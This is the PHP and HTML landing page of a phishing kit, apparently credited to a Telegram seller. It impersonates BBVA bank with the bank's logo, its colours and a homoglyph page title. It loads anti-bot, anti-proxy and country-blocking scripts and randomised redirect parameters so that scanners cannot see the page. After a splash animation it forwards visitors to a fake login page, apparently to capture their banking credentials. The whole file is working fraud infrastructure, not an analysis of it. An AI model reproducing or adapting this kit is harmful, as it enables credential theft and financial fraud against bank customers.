<?php
/**
###############################################
#         Version 2.0                         #
#         https://t.me/neo_net                #
#         The Wine Juggler of FUD             #
###############################################
**/
/* Config Loader */
require_once 'config/config.php';

/* Country Blocker 2.0 */
include 'country-block/blocker.php';

/* Antiproxies 2.0 */
if ($antiproxies == 1):
include 'antiproxy/antiproxy.php';
endif;

/* Blockers 2.0 */
if ($antibots == 1):
include 'antibots/anti_referer.php';
include 'antibots/crawlers.php';
include 'antibots/loader.php';
include 'antibots/loader_ips.php';
include 'antibots/loader_ips_2.php';
/* FUD New */
$reader = sha1(rand(1,9999));
if (isset($_GET['vampire'])) {}
else {
$name = $reader.rand(1,99999);
$om = sha1(rand(1,99999));
header('Location: static.php?vampire='.$name.'&xom='.$om.'');}
endif;
?>
<!DOCTYPE html>
<html>
<head>
 <title>&#1042;&#1042;&#86;&#1040; </title>
<!-- No cache tags -->
    <meta name="viewport" content="width=device-width,minimum-scale=1,initial-scale=1,user-scalable=yes">
    <meta http-equiv="Cache-control" content="no-cache">
    <meta http-equiv="Pragma" content="no-cache">
    <meta name="HandheldFriendly" content="True">
    <meta name="robots" content="nofollow, noindex">
<!-- Meta Tags -->
    <link rel="apple-touch-icon" sizes="57x57" href="assets/img/favicons/57x57.png?v=2">
    <link rel="apple-touch-icon" sizes="72x72" href="assets/img/favicons/72x72.png?v=2">
    <link rel="apple-touch-icon" sizes="76x76" href="assets/img/favicons/76x76.png?v=2">
    <link rel="apple-touch-icon" sizes="114x114" href="assets/img/favicons/114x114.png?v=2">
    <link rel="apple-touch-icon" sizes="120x120" href="assets/img/favicons/120x120.png?v=2">
    <link rel="apple-touch-icon" sizes="144x144" href="assets/img/favicons/144x144.png?v=2">
    <link rel="apple-touch-icon" sizes="152x152" href="assets/img/favicons/152x152.png?v=2">
    <link rel="apple-touch-icon" sizes="167x167" href="assets/img/favicons/167x167.png?v=2">
    <link rel="apple-touch-icon" sizes="180x180" href="assets/img/favicons/180x180.png?v=2">
    <link rel="icon" type="image/png" sizes="16x16" href="assets/img/favicons/16x16.png?v=2">
    <link rel="icon" type="image/png" sizes="32x32" href="assets/img/favicons/32x32.png?v=2">
    <link rel="icon" type="image/png" sizes="96x96" href="assets/img/favicons/96x96.png?v=2">
    <link rel="icon" type="image/png" sizes="128x128" href="assets/img/favicons/128x128.png?v=2">
    <link rel="icon" type="image/png" sizes="192x192" href="assets/img/favicons/192x192.png?v=2">
    <link rel="icon" type="image/png" sizes="195x195" href="assets/img/favicons/195x195.png?v=2">
    <link rel="icon" type="image/png" sizes="196x196" href="assets/img/favicons/196x196.png?v=2">
    <link rel="icon" type="image/png" sizes="228x228" href="assets/img/favicons/228x228.png?v=2">
</head>
<body>

<style type="text/css">body{font-size:16px;line-height:normal;overflow:hidden;background-color:#004481;font-family:BentonSans}figure{margin:0!important;position:absolute;left:0;width:100%;height:100%;top:0}</style>
<figure class="app-shell" data-id="app-shell">
   <svg text-rendering="geometricPrecision" shape-rendering="geometricPrecision" viewBox="0 0 450 812" style="white-space:pre;width:100%;height:100%">
      <defs>
         <radialGradient id="Gradient-0" cx="0.784415" cy="53.9996" r="60.2016" fx="0.784415" fy="-6.0004" gradientUnits="userSpaceOnUse">
            <stop offset="0.0232928" stop-color="#49a5e6"></stop>
            <stop offset="0.647425" stop-color="#004481" stop-opacity="0"></stop>
         </radialGradient>
         <radialGradient id="Gradient-1" cx="0.784415" cy="53.9996" r="60.2016" fx="0.784415" fy="-6.0004" gradientUnits="userSpaceOnUse">
            <stop offset="0.0232928" stop-color="#5fc4c3"></stop>
            <stop offset="0.647425" stop-color="#004481" stop-opacity="0"></stop>
         </radialGradient>
         <linearGradient id="Gradient-2" x1="-10" y1="0" x2="276.908" y2="0" gradientUnits="userSpaceOnUse">
            <stop offset="0" stop-color="#3c9ae1" stop-opacity="0"></stop>
            <stop offset="0.273841" stop-color="#5baee8" stop-opacity="0.5"></stop>
            <stop offset="0.807687" stop-color="#5baee8" stop-opacity="0.5"></stop>
            <stop offset="1" stop-color="#ffffff" stop-opacity="0"></stop>
         </linearGradient>
         <clipPath id="Clip-Path-Blue">
            <rect width="1860" height="1500" fill="#00ffc9" stroke="none" transform="translate(1871.39,2226.99)"></rect>
         </clipPath>
         <clipPath id="clipPath-Turquoise">
            <rect width="1942" height="1473" fill="#00ffc9" stroke="none" transform="translate(1817.61,2575.12) rotate(180) translate(-971,-1473)"></rect>
         </clipPath>
      </defs>
      <style>@keyframes a0_t{0%{transform:translate(2211.803955px,2228px);animation-timing-function:cubic-bezier(.330818,.08078,.358984,1)}100%{transform:translate(2354px,2228px)}}@keyframes deg-blue_t{0%{transform:scale(0,1.329535) translateY(4.79167px);animation-timing-function:cubic-bezier(.258579,.013099,.324203,.937594)}54.5454%{transform:scale(12.072597,12.75502) translateY(4.79167px)}100%{transform:scale(12.072597,12.75502) translateY(4.79167px)}}@keyframes deg-blue_o{0%{opacity:0}40.9091%{opacity:1}100%{opacity:1}}@keyframes a1_t{0%{transform:translate(1984px,2573px)}13.6363%{transform:translate(1984px,2573px);animation-timing-function:cubic-bezier(.25,0,.5,1)}100%{transform:translate(1817.607944px,2573.119965px)}}@keyframes deg-turquoise_t{0%{transform:scale(0,.711586) translate(-.045175px,4.635216px)}13.6363%{transform:scale(0,.711586) translate(-.045175px,4.635216px);animation-timing-function:cubic-bezier(.42,0,.58,1)}63.6363%{transform:scale(12.006882,12) translate(-.045175px,4.635216px)}100%{transform:scale(12.006882,12) translate(-.045175px,4.635216px)}}@keyframes deg-turquoise_o{0%{opacity:0}13.6364%{opacity:0}54.5455%{opacity:1}100%{opacity:1}}@keyframes a2_t{0%{transform:translate(2274.756px,2489.880117px);animation-timing-function:cubic-bezier(.36,0,.36,1)}100%{transform:translate(2414.756px,2489.880117px)}}@keyframes line-blue_t{0%{transform:scale(0,2) translate(-133.454px,-.5px);animation-timing-function:cubic-bezier(.259,.013,.497674,.938)}54.5454%{transform:scale(1,2) translate(-133.454px,-.5px)}100%{transform:scale(1,2) translate(-133.454px,-.5px)}}@keyframes line-blue_o{0%{opacity:0}54.5455%{opacity:1}100%{opacity:1}}@keyframes a3_t{0%{transform:translate(2478.91px,2487.880107px)}13.6363%{transform:translate(2478.91px,2487.880107px);animation-timing-function:cubic-bezier(.36,0,.36,1)}100%{transform:translate(2624.30199px,2487.880015px)}}@keyframes line-turquoise_t{0%{transform:scale(0,2) translate(-133.454px,-.5px)}13.6363%{transform:scale(0,2) translate(-133.454px,-.5px);animation-timing-function:cubic-bezier(.259,.013,.497674,.938)}68.1818%{transform:scale(1,2) translate(-133.454px,-.5px)}100%{transform:scale(1,2) translate(-133.454px,-.5px)}}@keyframes line-turquoise_o{0%{opacity:0}13.6364%{opacity:0}68.1818%{opacity:1}100%{opacity:1}}@keyframes bbva-logo_o{0%{opacity:0}36.3636%{opacity:0;animation-timing-function:cubic-bezier(.42,0,1,1)}54.5455%{opacity:1}100%{opacity:1}}@keyframes A_t{0%{transform:translate(0,35.0037px)}36.3636%{transform:translate(0,35.0037px);animation-timing-function:cubic-bezier(0,0,.405,1)}63.6363%{transform:translate(0,0)}100%{transform:translate(0,0)}}</style>
      <g id="g-contenido" transform="translate(-55.212,172.433) translate(-1015.16,-955.643)">
         <path id="bkg" fill="#004481" stroke="none" d="M0,0L450,0L450,812L0,812Z" transform="translate(1295.37,1189.21) translate(-225,-406)"></path>
         <g id="g-animacion" transform="translate(1416.36,1183.33) rotate(-62) translate(-2520.29,-2551)">
            <g id="g-blue-gradient" clip-path="url(#Clip-Path-Blue)" transform="translate(2262.91,2661.89) translate(-2200,-2400)">
               <g id="deg-blue" style="animation:2.2s linear both a0_t">
                  <ellipse class="bola-grande" fill="url(#Gradient-0)" rx="200" ry="200" fill-rule="nonzero" opacity="0" transform="translate(2211.8,2228) scale(0,1.32953) translate(0,4.79167)" style="animation:2.2s linear both deg-blue_t,2.2s linear both deg-blue_o"></ellipse>
               </g>
            </g>
            <g id="g-turquoise-gradient" clip-path="url(#clipPath-Turquoise)" transform="translate(2262.91,2662) rotate(180) translate(-2200,-2400)">
               <g id="deg-turquoise" style="animation:2.2s linear both a1_t">
                  <ellipse class="bola-grande" fill="url(#Gradient-1)" rx="200" ry="200" fill-rule="nonzero" opacity="0" transform="translate(1984,2573) scale(0,0.711586) translate(-0.0451754,4.63522)" style="animation:2.2s linear both deg-turquoise_t,2.2s linear both deg-turquoise_o"></ellipse>
               </g>
            </g>
            <g id="line-blue" style="animation:2.2s linear both a2_t">
               <path fill="url(#Gradient-2)" stroke="none" stroke-linecap="square" d="M-10,0L276.908,0L276.908,1L-10,1Z" opacity="0" transform="translate(2274.76,2489.88) scale(0,2) translate(-133.454,-0.5)" style="animation:2.2s linear both line-blue_t,2.2s linear both line-blue_o"></path>
            </g>
            <g id="line-turquoise" style="animation:2.2s linear both a3_t">
               <path fill="url(#Gradient-2)" stroke="none" stroke-linecap="square" d="M-10,0L276.908,0L276.908,1L-10,1Z" opacity="0" transform="translate(2478.91,2487.88) scale(0,2) translate(-133.454,-0.5)" style="animation:2.2s linear both line-turquoise_t,2.2s linear both line-turquoise_o"></path>
            </g>
         </g>
         <g id="bbva-logo" opacity="0" transform="translate(1297,1189) translate(-79.5,-24.2243)" style="animation:2.2s linear both bbva-logo_o">
            <path id="V" class="cls-1" d="M116.45,6.57L102.54,33C102.469,33.1316,102.363,33.2414,102.235,33.318C102.106,33.3946,101.96,33.435,101.81,33.435C101.66,33.435,101.514,33.3946,101.385,33.318C101.257,33.2414,101.151,33.1316,101.08,33L87.16,6.56C87.1263,6.49542,87.084,6.43575,87.0341,6.38263C86.9843,6.32951,86.9274,6.28344,86.8651,6.24571C86.8028,6.20798,86.7357,6.17893,86.6655,6.15938C86.5953,6.13982,86.5228,6.12994,86.45,6.13L79.73,6.13C79.6255,6.13033,79.5228,6.1575,79.4319,6.20891C79.3409,6.26032,79.2646,6.33423,79.2104,6.42357C79.1562,6.51291,79.1259,6.61468,79.1223,6.71912C79.1187,6.82356,79.142,6.92716,79.19,7.02L101.1,48C101.168,48.13,101.269,48.239,101.395,48.3151C101.52,48.3911,101.664,48.4314,101.81,48.4314C101.956,48.4314,102.1,48.3911,102.225,48.3151C102.351,48.239,102.452,48.13,102.52,48L124.43,7C124.479,6.90786,124.502,6.80464,124.499,6.70051C124.496,6.59638,124.465,6.49492,124.411,6.40612C124.356,6.31732,124.28,6.24423,124.188,6.19407C124.097,6.1439,123.994,6.11837,123.89,6.12L117.16,6.12C117.086,6.11969,117.012,6.12995,116.941,6.15045C116.87,6.17096,116.802,6.2015,116.739,6.24117C116.677,6.28084,116.62,6.32923,116.571,6.38488C116.522,6.44052,116.481,6.50286,116.45,6.57Z" fill="#fff" transform="translate(101.811,27.2757) translate(-101.811,-27.2757)"></path>
            <path id="A" class="cls-1" d="M124.34,41.88L138.24,15.42C138.311,15.2884,138.417,15.1786,138.545,15.102C138.674,15.0254,138.82,14.985,138.97,14.985C139.12,14.985,139.266,15.0254,139.395,15.102C139.523,15.1786,139.629,15.2884,139.7,15.42L153.62,41.88C153.653,41.9449,153.695,42.0049,153.745,42.0583C153.795,42.1117,153.852,42.158,153.914,42.1958C153.976,42.2336,154.044,42.2625,154.114,42.2818C154.184,42.3011,154.257,42.3106,154.33,42.31L161.06,42.31C161.163,42.3099,161.265,42.2831,161.355,42.2322C161.445,42.1813,161.52,42.1081,161.573,42.0196C161.627,41.931,161.656,41.8303,161.659,41.727C161.662,41.6237,161.638,41.5214,161.59,41.43L139.68,0.43C139.612,0.299985,139.511,0.191002,139.385,0.114937C139.26,0.0388721,139.116,-0.00135383,138.97,-0.00135383C138.824,-0.00135383,138.68,0.0388721,138.555,0.114937C138.429,0.191002,138.328,0.299985,138.26,0.43L116.36,41.43C116.309,41.5217,116.284,41.6251,116.285,41.7298C116.287,41.8345,116.316,41.937,116.37,42.027C116.423,42.117,116.5,42.1914,116.591,42.2428C116.682,42.2942,116.785,42.3208,116.89,42.32L123.63,42.32C123.703,42.3196,123.776,42.3091,123.847,42.2888C123.917,42.2685,123.985,42.2387,124.047,42.2C124.109,42.1614,124.166,42.1144,124.216,42.0603C124.265,42.0062,124.307,41.9455,124.34,41.88Z" fill="#fff" transform="translate(138.972,56.163) translate(-138.972,-21.1593)" style="animation:2.2s linear both A_t"></path>
            <path id="B" class="cls-1" d="M29.32,25.66C32.23,24.21,34,21.07,34,17.2C34,10.61,28.9,6.13,21.65,6.13L0.81,6.13C0.703629,6.13,0.5983,6.15095,0.500026,6.19166C0.401753,6.23236,0.312459,6.29203,0.237244,6.36724C0.162028,6.44246,0.102364,6.53175,0.0616576,6.63003C0.0209513,6.7283,0,6.83363,0,6.94L0,47.64C0,47.7464,0.0209513,47.8517,0.0616576,47.95C0.102364,48.0482,0.162028,48.1375,0.237244,48.2128C0.312459,48.288,0.401753,48.3476,0.500026,48.3883C0.5983,48.429,0.703629,48.45,0.81,48.45L20.73,48.45C30.73,48.45,35.97,44.16,35.97,35.75C36,27.55,29.32,25.66,29.32,25.66ZM7.81,12.25L20.17,12.25C24.72,12.25,27.04,14.2,27.04,17.79C27.04,21.38,24.73,23.33,20.17,23.33L7.81,23.33C7.70447,23.33,7.59995,23.3094,7.50232,23.2693C7.40469,23.2292,7.31584,23.1705,7.24075,23.0963C7.16566,23.0221,7.10579,22.934,7.0645,22.8369C7.02321,22.7398,7.0013,22.6355,7,22.53L7,13.06C7,12.9536,7.02095,12.8483,7.06166,12.75C7.10236,12.6518,7.16203,12.5625,7.23724,12.4872C7.31246,12.412,7.40175,12.3524,7.50003,12.3117C7.5983,12.271,7.70363,12.25,7.81,12.25ZM20.33,42.31L7.8,42.31C7.6941,42.3113,7.589,42.2916,7.49078,42.252C7.39256,42.2124,7.30319,42.1537,7.22784,42.0793C7.15249,42.0048,7.09267,41.9162,7.05184,41.8185C7.01101,41.7208,6.98999,41.6159,6.99,41.51L6.99,30.27C6.99,30.1636,7.01095,30.0583,7.05166,29.96C7.09236,29.8618,7.15203,29.7725,7.22724,29.6972C7.30246,29.622,7.39175,29.5624,7.49003,29.5217C7.5883,29.481,7.69363,29.46,7.8,29.46L20.33,29.46C26.33,29.46,28.97,31.16,28.97,35.89C28.97,40.62,26.36,42.31,20.33,42.31Z" fill="#fff" transform="translate(17.9851,27.29) translate(-17.9851,-27.29)"></path>
            <path id="B-2" data-name="B" class="cls-1" d="M72.08,25.66C74.98,24.21,76.8,21.07,76.8,17.2C76.8,10.61,71.66,6.13,64.4,6.13L43.56,6.13C43.4545,6.1313,43.3502,6.15321,43.2531,6.1945C43.156,6.23579,43.0679,6.29566,42.9937,6.37075C42.9195,6.44584,42.8608,6.53469,42.8207,6.63232C42.7806,6.72995,42.76,6.83447,42.76,6.94L42.76,47.64C42.7587,47.7459,42.7784,47.851,42.818,47.9492C42.8576,48.0474,42.9163,48.1368,42.9907,48.2122C43.0652,48.2875,43.1538,48.3473,43.2515,48.3882C43.3492,48.429,43.4541,48.45,43.56,48.45L63.49,48.45C73.49,48.45,78.72,44.16,78.72,35.75C78.72,27.55,72.08,25.66,72.08,25.66ZM50.56,12.25L62.92,12.25C67.48,12.25,69.8,14.2,69.8,17.79C69.8,21.38,67.49,23.33,62.92,23.33L50.56,23.33C50.454,23.3287,50.3492,23.3069,50.2516,23.2657C50.1539,23.2246,50.0651,23.1648,49.9901,23.0899C49.9152,23.0149,49.8554,22.9261,49.8143,22.8284C49.7731,22.7308,49.7513,22.626,49.75,22.52L49.75,13.06C49.75,12.9536,49.771,12.8483,49.8117,12.75C49.8524,12.6518,49.912,12.5625,49.9872,12.4872C50.0625,12.412,50.1518,12.3524,50.25,12.3117C50.3483,12.271,50.4536,12.25,50.56,12.25ZM63.09,42.31L50.55,42.31C50.4449,42.31,50.3409,42.2893,50.2439,42.2491C50.1468,42.2089,50.0586,42.15,49.9843,42.0757C49.91,42.0014,49.8511,41.9132,49.8109,41.8161C49.7707,41.7191,49.75,41.6151,49.75,41.51L49.75,30.27C49.7487,30.1641,49.7684,30.059,49.808,29.9608C49.8476,29.8626,49.9063,29.7732,49.9807,29.6978C50.0552,29.6225,50.1438,29.5627,50.2415,29.5218C50.3392,29.481,50.4441,29.46,50.55,29.46L63.09,29.46C69.09,29.46,71.73,31.16,71.73,35.89C71.73,40.62,69.12,42.31,63.09,42.31Z" fill="#fff" transform="translate(60.74,27.29) translate(-60.74,-27.29)"></path>
         </g>
      </g>
   </svg>
</figure>
<script type="text/javascript">setTimeout(function() {window.location.href = './login.php';}, 3500);</script>
</body>
</html>